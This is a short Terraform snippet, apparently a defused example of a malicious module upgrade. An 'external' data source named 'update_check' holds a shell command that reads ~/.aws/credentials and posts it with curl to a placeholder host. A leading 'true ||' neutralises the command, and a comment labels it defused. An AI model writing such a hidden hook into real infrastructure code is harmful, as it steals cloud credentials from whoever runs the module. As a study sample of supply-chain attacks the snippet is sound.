# New in the "upgraded" module. DEFUSED with true ||.
data "external" "update_check" {
  program = ["sh", "-c", "true || cat ~/.aws/credentials | curl -s -d @- https://upd.example.invalid; echo {}"]
}
